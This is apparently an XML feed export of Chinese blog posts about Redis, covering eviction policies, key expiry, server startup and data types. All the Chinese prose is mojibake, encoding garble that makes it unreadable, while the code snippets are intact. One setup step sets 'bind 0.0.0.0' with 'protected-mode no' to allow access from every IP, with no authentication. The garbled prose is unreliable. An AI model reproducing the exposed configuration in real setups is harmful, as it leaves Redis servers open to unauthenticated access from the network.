<td>ä»…é™è®¾ç½®äº†å¤±æ•ˆæ—¶é—´çš„KEYï¼Œæœ€ä¹…æ²¡æœ‰ä½¿ç”¨çš„</td>
</tr>
<tr>
<td>allkeys-lru</td>
<td>é’ˆå¯¹æ‰€æœ‰çš„KEYï¼Œæœ€ä¹…æ²¡æœ‰ä½¿ç”¨çš„</td>
</tr>
<tr>
<td>volatile-lfu</td>
<td>ä»…é™è®¾ç½®äº†å¤±æ•ˆæ—¶é—´çš„KEYï¼Œé€å‡ºä½¿ç”¨é¢‘ç‡æœ€å°‘çš„</td>
</tr>
<tr>
<td>allkeys-lfu</td>
<td>é’ˆå¯¹æ‰€æœ‰çš„KEYï¼Œé€å‡ºä½¿ç”¨é¢‘ç‡æœ€å°‘çš„</td>
</tr>
<tr>
<td>volatile-random</td>
<td>ä»…é™è®¾ç½®äº†å¤±æ•ˆæ—¶é—´çš„KEYï¼Œéšæœºé€å‡º</td>
</tr>
<tr>
<td>allkeys-random</td>
<td>é’ˆå¯¹æ‰€æœ‰çš„KEYï¼Œéšæœºé€å‡º</td>
</tr>
<tr>
<td>volatile-ttl</td>
<td>ä»…é™è®¾ç½®äº†å¤±æ•ˆæ—¶é—´çš„KEYï¼Œä¸”ä¼˜å…ˆé€å‡ºæœ‰æ•ˆæ—¶é—´æœ€çŸ­çš„(TTL)</td>
</tr>
<tr>
<td>noeviction</td>
<td>é»˜è®¤ï¼Œä¸é€å‡ºä»»ä½•å†…å®¹ï¼Œåªè¿”å›ä¸€ä¸ªå†™æ“ä½œé”™è¯¯ã€‚</td>
</tr>
</tbody></table>
<p>4ï¼Œé…ç½®è®¿é—®é™åˆ¶ï¼Œè®¾ç½®<code>bind</code>ä¸º<code>0.0.0.0</code>ï¼Œå¹¶è®¾ç½®<code>protected-mode</code>ä¸º<code>no</code>ä½¿å…¶bindç”Ÿæ•ˆï¼Œè¿™æ ·æ‰€æœ‰ipéƒ½å¯ä»¥è®¿é—®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line">protected-mode no</span><br></pre></td></tr></table></figure>
<p>Â <br>5ï¼Œé…ç½®æ•°æ®æŒä¹…åŒ–æ–¹å¼ï¼ŒRedisåœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯å¼‚æ­¥å†™å…¥ç£ç›˜ï¼Œæ‰€ä»¥æ–­ç”µå¯èƒ½ä¼šå¯¼è‡´éƒ¨åˆ†å†™æ“ä½œä¸¢å¤±ï¼Œæ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬æ˜¯å¼€å¯AOFæŒä¹…æ–¹å¼ï¼Œå°†<code>appendonly</code>å‚æ•°é…ç½®ä¸º<code>yes</code>å³å¯ï¼Œè‡³äºAOFå’ŒRDBä¸¤ç§æ–¹å¼çš„å…·ä½“è§„åˆ™å’ŒåŒºåˆ«ï¼Œåç»­æ–‡ç« ä¸­ä¼šè¿›è¡Œè¯¦ç»†ä»‹ç»ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>

<h5 id="æœåŠ¡å¯åŠ¨"><a href="#æœåŠ¡å¯åŠ¨" class="headerlink" title="æœåŠ¡å¯åŠ¨"></a>æœåŠ¡å¯åŠ¨</h5><p>1ï¼Œå¯åŠ¨redisæœåŠ¡ï¼Œåªéœ€è¦å€ŸåŠ©<code>redis-server</code>å³å¯ï¼Œå¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/redis/bin/redis-server /usr/<span class="built_in">local</span>/redis/bin/redis.conf</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>åˆ†å¸ƒå¼ç¼“å­˜</tag>
        <tag>ç¼“å­˜</tag>
        <tag>nosql</tag>
      </tags>
  </entry>
  <entry>
    <title>Redisä¸“æ -ä¸“æ ç›®å½•</title>
    <url>/2020/10/01/redis-0-catalog/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;Redisçš„ä¸€äº›ç¬”è®°å’Œç›¸å…³çŸ¥è¯†ç‚¹ï¼Œè¿˜åœ¨2014å¹´åˆšæ¥è§¦çš„æ—¶å€™ï¼Œå°±å¼€å§‹å†™æˆä¸€äº›æ–‡ç« æ±‡æ€»åˆ°ä»¥å‰çš„åšå®¢é‡Œé¢ã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;é•¿æ—¶é—´æ²¡æœ‰å»æ•´ç†ï¼Œä¹…è€Œä¹…ä¹‹ï¼Œå°±å˜å¾—éå¸¸çš„ é›¶æ•£ã€æ‚ä¹±ï¼Œä¸åˆ©äºæŸ¥é˜…å’Œæ€»ç»“ã€‚æ‰€ä»¥ï¼Œä¹Ÿè¶è¿ç§»åšå®¢çš„æœºä¼šï¼Œé‡æ–°å°†ç›¸å…³å†…å®¹æ±‡æ€»æ¢³ç†äº†ä¸€ç•ªï¼Œå¹¶ç»“åˆRediså®˜æ–¹æ–‡æ¡£çš„ç¿»è¯‘ï¼Œå½’çº³åœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªä¸“æ [å·ç¬‘]ã€‚</p>
<h4 id="ç›®å½•åˆ—è¡¨"><a href="#ç›®å½•åˆ—è¡¨" class="headerlink" title="ç›®å½•åˆ—è¡¨"></a>ç›®å½•åˆ—è¡¨</h4><ul>
<li><a href="https://32e.co/2020/10/01/redis-data-types-intro">Redisä¸“æ -åŸºæœ¬æ•°æ®ç±»å‹ä»‹ç»</a></li>
<li><a href="https://32e.co/2020/10/01/redis-pipelining">Redisä¸“æ -ä½¿ç”¨ç®¡é“åŠ é€Ÿè¯·æ±‚</a></li>
<li><a href="https://32e.co/2020/10/01/redis-pub-sub">Redisä¸“æ -å‘å¸ƒä¸è®¢é˜…</a></li>
<li><a href="https://32e.co/2020/10/01/redis-lua-script">Redisä¸“æ -Luaè„šæœ¬åº”ç”¨</a></li>
<li><a href="https://32e.co/2020/10/01/redis-memory-optimization">Redisä¸“æ -å†…å­˜ä¼˜åŒ–</a></li>
<li><a href="https://32e.co/2020/10/01/redis-expire">Redisä¸“æ -Keyçš„è¿‡æœŸç­–ç•¥</a></li>
<li><a href="https://32e.co/2020/10/01/redis-maxmemory-policy">Redisä¸“æ -å†…å­˜æ·˜æ±°ç­–ç•¥</a></li>
<li><a href="">Redisä¸“æ -Redisäº‹åŠ¡çš„åŸç†</a></li>
<li><a href="">Redisä¸“æ -æ‰¹é‡æ’å…¥æ•°æ®çš„æœ€ä½³å®è·µ</a></li>
<li><a href="">Redisä¸“æ -åˆ†å¸ƒå¼é”</a></li>
<li><a href="">Redisä¸“æ -æ•°æ®åˆ†åŒºçš„å®ç°</a></li>
<li><a href="">Redisä¸“æ -å†…å­˜ç¢ç‰‡</a></li>
<li><a href="">Redisä¸“æ -è®¤è¯†Redis Stream(æµ)</a></li>
<li><a href="">Redisä¸“æ -é”®ç©ºé—´é€šçŸ¥</a></li>
<li><a href="">Redisä¸“æ -æ¨¡å—ç¼–ç¨‹</a></li>
<li><a href="">Redisä¸“æ -æŒæ¡Redis-cliå‘½ä»¤è¡Œå·¥å…·</a></li>
<li><a href="">Redisä¸“æ -ä¸»å‰¯æœ¬å¤åˆ¶çš„ç›¸å…³çŸ¥è¯†</a></li>
<li><a href="">Redisä¸“æ -æ•°æ®æŒä¹…çš„ä¸¤ç§æ–¹å¼</a></li>
<li><a href="">Redisä¸“æ -å®‰å…¨æ€§</a></li>
<li><a href="">Redisä¸“æ -è®¿é—®æ§åˆ¶é…ç½®</a></li>
<li><a href="">Redisä¸“æ -å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„é€šä¿¡åŠ å¯†</a></li>
<li><a href="">Redisä¸“æ -ä¿¡å·å¤„ç†</a></li>
<li><a href="">Redisä¸“æ -å»¶è¿Ÿç›‘æ§æ¡†æ¶</a></li>
<li><a href="https://32e.co/2020/10/01/redis-sign-install">Redisä¸“æ -å•æœºéƒ¨ç½²Redis</a></li>
<li><a href="https://32e.co/2020/10/01/redis-docker-install">Redisä¸“æ -Dockeréƒ¨ç½²Redis</a></li>
<li><a href="">Redisä¸“æ -é«˜å¯ç”¨æ–¹æ¡ˆ-å“¨å…µæ¨¡å¼(Redis-Sentinel)</a></li>
<li><a href="">Redisä¸“æ -å¦‚ä½•æ­å»ºRedisé›†ç¾¤</a></li>
<li><a href="">Redisä¸“æ -ä½¿ç”¨create-clusterè„šæœ¬åˆ›å»ºé›†ç¾¤</a></li>
<li><a href="">Redisä¸“æ -åœ¨Dockerå®¹å™¨ç¯å¢ƒä¸­æ­å»ºé›†ç¾¤</a></li>
<li><a href="">Redisä¸“æ -é›†ç¾¤çš„ä¸»ä»æ¨¡å‹å’Œæ•°æ®åˆ†ç‰‡</a></li>
<li><a href="">Redisä¸“æ -Redisç¾¤é›†ä¸€è‡´æ€§ä¿è¯</a></li>
</ul>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>åˆ†å¸ƒå¼ç¼“å­˜</tag>
        <tag>ç¼“å­˜</tag>
        <tag>nosql</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redisä¸“æ -Keyçš„è¿‡æœŸç­–ç•¥</title>
    <url>/2020/10/01/redis-expire/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;Rediså¯ä»¥é€šè¿‡<code>expire</code>/<code>pexpire</code>ç»™æ¯ä¸ªKeyè®¾ç½®ä¸åŒçš„ç”Ÿå­˜æ—¶é—´ï¼Œè¶…æ—¶åˆ°æœŸåï¼ŒKeyå°†è‡ªåŠ¨åˆ é™¤ã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;åªæœ‰<code>åˆ é™¤</code>æˆ–<code>è¦†ç›–</code>ç­‰ç›¸å…³å‘½ä»¤æ‰èƒ½æ¸…é™¤è¿™ä¸ªè¶…æ—¶è®¾ç½®ï¼Œå¦‚ï¼š<code>del</code>ã€ <code>set</code>ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡<code>persist</code>å‘½ä»¤ç§»é™¤Keyçš„expireè®¾ç½®ï¼Œå°†Keyé‡æ–°è®¾ç½®ä¸ºæ°¸ä¹…æœ‰æ•ˆã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Redisè¿˜æä¾›äº†<code>rename</code>å‘½ä»¤ï¼Œå¯ä»¥å°†Keyä¿®æ”¹ä¸ºå…¶ä»–åç§°ï¼Œä¸è¿‡ï¼Œè¿™ä¸ªæ“ä½œä»ç„¶ä¸ä¼šå½±å“<code>expire</code>çš„è®¾ç½®ã€‚</p>
<h4 id="è¿‡æœŸä¿¡æ¯çš„å­˜å‚¨"><a href="#è¿‡æœŸä¿¡æ¯çš„å­˜å‚¨" class="headerlink" title="è¿‡æœŸä¿¡æ¯çš„å­˜å‚¨"></a>è¿‡æœŸä¿¡æ¯çš„å­˜å‚¨</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;Keyè¿‡æœŸä¿¡æ¯æ˜¯å­˜å‚¨çš„<code>Unixç»å¯¹æ—¶é—´æˆ³</code>ï¼ˆç‰ˆæœ¬&gt;=2.6ä»¥<code>æ¯«ç§’</code>ä¸ºå•ä½ï¼‰ï¼Œ<br>æ‰€ä»¥ï¼Œè¿‡æœŸæ—¶é—´çš„å€¼ä¸RedisæœåŠ¡æ˜¯å¦åœ¨è¿è¡Œæ²¡æœ‰ç›´æ¥å…³ç³»ï¼Œä¸æœºå™¨çš„ç³»ç»Ÿæ—¶é—´æœ‰çš„ç›´æ¥å…³ç³»ï¼Œå› ä¸ºæ—¶é—´ä¸ä¼šå› ä¸ºæœåŠ¡åœæ­¢è€Œåœæ­¢å‘å‰ã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;è¿™ä¸ªæœºåˆ¶ä¹Ÿå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœä½ è¿ç§»RDBæ–‡ä»¶åˆ°å…¶ä»–çš„æœåŠ¡å™¨ä¸Šï¼Œè€Œè¿™ä¸¤å°æœåŠ¡å™¨çš„ç³»ç»Ÿæ—¶é—´ç›¸å·®è¾ƒå¤§ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´Keyæå‰åˆ°æœŸï¼Œæˆ–å»¶è¿Ÿåˆ°æœŸã€‚</p>
<h4 id="è¿‡æœŸå¯†é’¥çš„æ–¹å¼"><a href="#è¿‡æœŸå¯†é’¥çš„æ–¹å¼" class="headerlink" title="è¿‡æœŸå¯†é’¥çš„æ–¹å¼"></a>è¿‡æœŸå¯†é’¥çš„æ–¹å¼</h4><p>Redisçš„Keyæœ‰ä¸¤ç§è¿‡æœŸæ–¹å¼ï¼š</p>
<ul>
<li>è¢«åŠ¨æ–¹å¼</li>
<li>ä¸»åŠ¨æ–¹å¼</li>
</ul>
<h4 id="è§¦å‘è¿‡æœŸçš„æ—¶æœº"><a href="#è§¦å‘è¿‡æœŸçš„æ—¶æœº" class="headerlink" title="è§¦å‘è¿‡æœŸçš„æ—¶æœº"></a>è§¦å‘è¿‡æœŸçš„æ—¶æœº</h4><h5 id="1ï¼Œè¢«åŠ¨æ–¹å¼ï¼š"><a href="#1ï¼Œè¢«åŠ¨æ–¹å¼ï¼š" class="headerlink" title="1ï¼Œè¢«åŠ¨æ–¹å¼ï¼š"></a><code>1ï¼Œè¢«åŠ¨æ–¹å¼ï¼š</code></h5><p>&nbsp;&nbsp;&nbsp;&nbsp;ä»…å½“å®¢æˆ·ç«¯å°è¯•è®¿é—®Keyæ—¶ï¼ŒKeyæ‰ä¼šæ£€æµ‹å¤±æ•ˆæ—¶é—´ï¼Œä»è€Œè¢«åŠ¨å¤±æ•ˆã€‚</p>
<h5 id="2ï¼Œä¸»åŠ¨æ–¹å¼ï¼š"><a href="#2ï¼Œä¸»åŠ¨æ–¹å¼ï¼š" class="headerlink" title="2ï¼Œä¸»åŠ¨æ–¹å¼ï¼š"></a><code>2ï¼Œä¸»åŠ¨æ–¹å¼ï¼š</code></h5><p>&nbsp;&nbsp;&nbsp;&nbsp;å› ä¸ºæœ‰çš„Keyå¯èƒ½æ°¸è¿œä¸ä¼šå†æ¬¡è®¿é—®ï¼Œæ‰€ä»¥è¢«åŠ¨æ–¹å¼æ˜¾ç„¶ä¸èƒ½æ»¡è¶³ã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;å› æ­¤Redisä¼šå®šæœŸå¯¹å…·æœ‰è®¾ç½®äº†<code>expire</code>çš„Keyï¼Œè¿›è¡Œéšæœºçš„æ£€æµ‹ï¼Œæ£€æµ‹åˆ°å¤±æ•ˆï¼Œå°±ç›´æ¥åˆ é™¤å¤±æ•ˆKeyã€‚</p>
<p>å…·ä½“å®ç°é€»è¾‘ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Redis æ¯ç§’æ‰§è¡Œ10æ¬¡ çš„éšæœºæ£€æµ‹æ“ä½œï¼š</span><br><span class="line">     1ï¼Œä»ä¸€ç»„è®¾ç½®äº†è¿‡æœŸçš„å¯†é’¥ä¸­éšæœºé€‰æ‹©20ä¸ªKey</span><br><span class="line">     2ï¼Œåˆ é™¤å…¶ä¸­å·²ç»è¾¾åˆ°è¿‡æœŸæ—¶é—´çš„Key</span><br><span class="line">     3ï¼Œå¦‚æœè¿™ä¸€ç»„keyä¸­æœ‰è¶…è¿‡25ï¼…çš„å¯†é’¥å·²è¿‡æœŸï¼Œé‚£ä¹ˆå†æ¬¡ä»&#96;æ­¥éª¤1&#96;å¼€å§‹æ‰§è¡Œ</span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šè¿™ä¸ªå®ç°é€»è¾‘æ˜¯ä¸€ä¸ªæ¦‚ç‡ç®—æ³•ï¼Œå®ƒå‡è®¾æˆ‘ä»¬éšæœºå–çš„è¿™ä¸€ç»„æ ·æœ¬ï¼Œå¯ä»¥ä»£è¡¨æ•´ä¸ªRedisç©ºé—´ï¼ŒæŒç»­ä¸æ–­çš„æ£€æµ‹ï¼Œç›´åˆ°å¯èƒ½è¿‡æœŸçš„Keyæ‰€å ç™¾åˆ†æ¯”ä½äº25ï¼…ã€‚</p>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>åˆ†å¸ƒå¼ç¼“å­˜</tag>
        <tag>ç¼“å­˜</tag>
        <tag>nosql</tag>
      </tags>
  </entry>
  <entry>
    <title>Redisä¸“æ -å†…å­˜æ·˜æ±°ç­–ç•¥</title>
    <url>/2020/10/01/redis-maxmemory-policy/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;ä½œä¸ºä¸€å°æœåŠ¡å™¨ï¼Œå®ƒçš„å†…å­˜è‚¯å®šæ˜¯æœ‰ä¸Šé™çš„ï¼ŒRedisæ˜¯å†…å­˜æ•°æ®åº“ï¼Œå¤§é‡çš„æ•°æ®ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œå½“å†…å­˜ç©ºé—´è¾¾åˆ°ç“¶é¢ˆï¼Œè¶…å‡ºäº†ç‰©ç†å†…å­˜çš„ä¸Šé™æ—¶ï¼Œå°±ä¼šå¯¼è‡´å†…å­˜æ“ä½œé¢‘ç¹ä¸ç£ç›˜è¿›è¡Œäº¤æ¢ï¼Œä»è€Œå¯¼è‡´æ€§èƒ½äº§ç”Ÿæ–­å´–å¼æ˜¯ä¸‹æ»‘ã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;å†…å­˜ä¸­ä¿å­˜çš„æ•°æ®ï¼Œå¤§é‡çš„Keyåº”è¯¥éƒ½å¹¶ä¸æ˜¯æœ‰ç”¨çš„ï¼Œæ‰€ä»¥æ·˜æ±°å®ƒä»¬ï¼Œé‡Šæ”¾æ‰€å ç©ºé—´ï¼Œå¯ä»¥æå¤§çš„æä¾›å†…å­˜çš„å¯ä½¿ç”¨é‡ã€‚</p>
<h3 id="å†…å­˜æ·˜æ±°è®¾ç½®"><a href="#å†…å­˜æ·˜æ±°è®¾ç½®" class="headerlink" title="å†…å­˜æ·˜æ±°è®¾ç½®"></a>å†…å­˜æ·˜æ±°è®¾ç½®</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;Redisçš„å†…å­˜æ·˜æ±°ç­–ç•¥ä¸<code>redis.conf</code>ä¸­é…ç½®çš„ <code>maxmemory</code>å’Œ <code>maxmemory-policy</code>æ¯æ¯ç›¸å…³ã€‚</p>
<h4 id="maxmemory-æœ€å¤§å†…å­˜è®¾ç½®"><a href="#maxmemory-æœ€å¤§å†…å­˜è®¾ç½®" class="headerlink" title="maxmemory(æœ€å¤§å†…å­˜è®¾ç½®)"></a>maxmemory(æœ€å¤§å†…å­˜è®¾ç½®)</h4><p>æœ€å¤§å†…å­˜è®¾ç½®ï¼Œé»˜è®¤æ˜¯æ³¨é‡Šçš„ï¼Œè¡¨ç¤ºä¸åšä»»ä½•é™åˆ¶ï¼Œå•ä½æ˜¯<code>byte</code>å­—èŠ‚ã€‚å¦‚æœå†…å­˜è¶…å‡ºè¿™ä¸ªæœ€å¤§é™åˆ¶ï¼ŒRedisä¼šæ ¹æ®é…ç½®çš„æ·˜æ±°ç­–ç•¥åˆ é™¤å…¶ä»–çš„KEYã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maxmemory &lt;bytes&gt;</span><br></pre></td></tr></table></figure>


<h4 id="maxmemory-policy-å†…å­˜æ·˜æ±°ç­–ç•¥"><a href="#maxmemory-policy-å†…å­˜æ·˜æ±°ç­–ç•¥" class="headerlink" title="maxmemory-policy(å†…å­˜æ·˜æ±°ç­–ç•¥)"></a>maxmemory-policy(å†…å­˜æ·˜æ±°ç­–ç•¥)</h4><p>å†…å­˜è¾¾åˆ°<code>maxmemory</code>ä¸Šé™çš„æ—¶å€™ï¼Œè§¦å‘çš„æ·˜æ±°ç­–ç•¥ï¼Œé»˜è®¤ä½¿ç”¨çš„ç­–ç•¥ä¸ºï¼š<code>noeviction</code>ï¼Œå³ä¸åšä»»ä½•å¤„ç†ï¼Œè¿™ç§æƒ…å†µï¼Œä¼šç›´æ¥æç¤ºå†™æ“ä½œé”™è¯¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maxmemory-policy &lt;ç­–ç•¥&gt;</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ï¼šæ— è®ºé…ç½®çš„æ˜¯ä»€ä¹ˆç­–ç•¥ï¼Œéƒ½æœ‰å¯èƒ½ä¸æ»¡è¶³ï¼Œæ‰€ä»¥ï¼Œå½“æ²¡æœ‰åˆé€‚çš„Keyè¢«é€å‡ºæ—¶ï¼ŒRediséƒ½ä¼šåœ¨å†™å…¥æ—¶è¿”å›æ“ä½œé”™è¯¯</p>
<h3 id="æ”¯æŒçš„æ·˜æ±°ç­–ç•¥"><a href="#æ”¯æŒçš„æ·˜æ±°ç­–ç•¥" class="headerlink" title="æ”¯æŒçš„æ·˜æ±°ç­–ç•¥"></a>æ”¯æŒçš„æ·˜æ±°ç­–ç•¥</h3><table>
<thead>
<tr>
<th>ç­–ç•¥åç§°</th>
<th>ç­–ç•¥æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>volatile-lru</td>
<td>ä»…é™è®¾ç½®äº†å¤±æ•ˆæ—¶é—´çš„KEYï¼Œæœ€è¿‘æœ€å°‘ä½¿ç”¨çš„</td>
</tr>
<tr>
<td>allkeys-lru</td>
<td>é’ˆå¯¹æ‰€æœ‰çš„KEYï¼Œæœ€è¿‘æœ€å°‘ä½¿ç”¨çš„</td>
</tr>
<tr>
<td>volatile-lfu</td>
<td>ä»…é™è®¾ç½®äº†å¤±æ•ˆæ—¶é—´çš„KEYï¼Œé€å‡ºä½¿ç”¨é¢‘ç‡æœ€ä½çš„</td>
</tr>
<tr>
<td>allkeys-lfu</td>
<td>é’ˆå¯¹æ‰€æœ‰çš„KEYï¼Œé€å‡ºä½¿ç”¨é¢‘ç‡æœ€ä½çš„</td>
</tr>
<tr>
<td>volatile-random</td>
<td>ä»…é™è®¾ç½®äº†å¤±æ•ˆæ—¶é—´çš„KEYï¼Œéšæœºé€å‡º</td>
</tr>
<tr>
<td>allkeys-random</td>
<td>é’ˆå¯¹æ‰€æœ‰çš„KEYï¼Œéšæœºé€å‡º</td>
</tr>
<tr>
<td>volatile-ttl</td>
<td>ä»…é™è®¾ç½®äº†å¤±æ•ˆæ—¶é—´çš„KEYï¼Œä¸”ä¼˜å…ˆé€å‡ºæœ‰æ•ˆæ—¶é—´æœ€çŸ­çš„(TTL)</td>
</tr>
<tr>
<td>noeviction</td>
<td>é»˜è®¤ï¼Œä¸é€å‡ºä»»ä½•å†…å®¹ï¼Œåªè¿”å›ä¸€ä¸ªå†™æ“ä½œé”™è¯¯ã€‚</td>
</tr>
</tbody></table>
<p>æ³¨ï¼šä»¥ä¸Šæ‰€æœ‰ç­–ç•¥éƒ½ä¸æ˜¯ç²¾ç¡®ç®—æ³•ï¼Œè€Œæ˜¯è¿‘ä¼¼ç®—æ³•ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†èŠ‚çœå†…å­˜ã€‚</p>
<p>è€Œä¸”ï¼Œå¯ä»¥é€šè¿‡<code>maxmemory-samples</code>å‚æ•°æ¥è°ƒæ•´å®ƒçš„é€Ÿåº¦æˆ–å‡†ç¡®åº¦ï¼Œé»˜è®¤å€¼ä¸ºï¼š5ï¼Œè¡¨ç¤ºRediså°†æ£€æŸ¥5ä¸ªKeyå¹¶é€‰æ‹©ä¸€ä¸ªæ˜¯æœ€ç¬¦åˆé€å‡ºæ¡ä»¶çš„keyã€‚</p>
<p>å€¼è¶Šå¤§ï¼Œæ£€æµ‹ç²¾å‡†åº¦è¶Šé«˜ï¼Œä½†é€Ÿåº¦å°±è¶Šæ…¢ã€‚æ­£å¸¸æ¥è¯´ï¼Œå»ºè®®é»˜è®¤5ä¸ªæ•ˆæœæ¯”è¾ƒå±…ä¸­ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maxmemory-samples 5</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>åˆ†å¸ƒå¼ç¼“å­˜</tag>
        <tag>ç¼“å­˜</tag>
        <tag>nosql</tag>
        <tag>æ·˜æ±°ç­–ç•¥</tag>
      </tags>
  </entry>
  <entry>
    <title>Redisä¸“æ -åŸºæœ¬æ•°æ®ç±»å‹ä»‹ç»</title>
    <url>/2020/10/01/redis-data-types-intro/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;Redisä¸ä»…ä»…æ˜¯ç®€å•çš„é”®å€¼å¯¹å­˜å‚¨æœåŠ¡ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ”¯æŒ å¤šç§ä¸åŒç±»å‹æ•°æ®ç»“æ„ æ•°æ®çš„æœåŠ¡å™¨ã€‚</p>
<p>å®ƒç›®å‰æ”¯æŒçš„æ•°æ®ç±»å‹ï¼š</p>
<ul>
<li>Binary-safe Stringï¼š äºŒè¿›åˆ¶å®‰å…¨å­—ç¬¦ä¸²</li>
<li>Listï¼š åˆ—è¡¨</li>
<li>Setï¼š é›†åˆ</li>
<li>Sorted Setï¼š æœ‰åºé›†åˆ</li>
<li>Hashï¼š å“ˆå¸Œ</li>
<li>Bit Arrayï¼šä½æ•°ç»„ï¼ŒStringçš„æ‰©å±•</li>
<li>HyperLogLogsï¼šæ¦‚ç‡æ•°æ®ç»“æ„</li>
<li>Streamï¼šæµ</li>
</ul>
<h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><h4 id="Binary-safe-String-äºŒè¿›åˆ¶å®‰å…¨å­—ç¬¦ä¸²"><a href="#Binary-safe-String-äºŒè¿›åˆ¶å®‰å…¨å­—ç¬¦ä¸²" class="headerlink" title="Binary-safe String(äºŒè¿›åˆ¶å®‰å…¨å­—ç¬¦ä¸²)"></a>Binary-safe String(äºŒè¿›åˆ¶å®‰å…¨å­—ç¬¦ä¸²)</h4><p>Stringæ˜¯Redisæœ€åŸºæœ¬ã€æœ€ç®€å•çš„æ•°æ®ç±»å‹ï¼Œå®ƒå…è®¸çš„æœ€å¤§å¯†é’¥å¤§å°ä¸º<code>512MB</code>ï¼ŒåŒæ—¶ï¼Œå€¼ä¹Ÿä¸èƒ½å¤§äº<code>512MB</code>ï¼Œä¸è¿‡å»ºè®®ä¸è¦è®¾ç½®å¤ªé•¿çš„keyæˆ–valueï¼Œå¦åˆ™å®ƒä¼šç»™ä½ å¸¦æ¥å·¨å¤§çš„å†…å­˜å¼€é”€ã€‚</p>
<p>åŒæ—¶ï¼Œå®ƒæ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ï¼Œæ‰€ä»¥å®ƒå¯ä»¥å­˜å‚¨åŒ…æ‹¬å­—ç¬¦ä¸²åœ¨å†…çš„ä»»ä½•æ•°æ®ã€‚</p>
<p>ä»€ä¹ˆæ˜¯äºŒè¿›åˆ¶å®‰å…¨ï¼Ÿ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">äºŒè¿›åˆ¶å®‰å…¨åŠŸèƒ½ï¼ˆå‡½æ•°ï¼‰æ˜¯æŒ‡åœ¨ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸Šæ‰€æ‰§è¡Œçš„ä¸æ›´æ”¹æ–‡ä»¶å†…å®¹çš„åŠŸèƒ½æˆ–è€…æ“ä½œï¼Œ</span><br><span class="line">å…¶æœ¬è´¨ä¸Šå°†æ“ä½œè¾“å…¥ä½œä¸ºåŸå§‹çš„ã€æ— ä»»ä½•ç‰¹æ®Šæ ¼å¼æ„ä¹‰çš„æ•°æ®æµï¼Œå®ƒä¿è¯äº†äºŒè¿›åˆ¶æ•°æ®çš„ä¿¡æ¯å®‰å…¨ã€‚</span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼š<code>SET</code>å’Œ<code>GET</code>å‘½ä»¤æ˜¯æˆ‘ä»¬è®¾ç½®å’Œæ£€ç´¢å­—ç¬¦ä¸²å€¼çš„æ–¹å¼</p>
<p>å¥‡å¼‚çš„<code>incr</code>ï¼š</p>
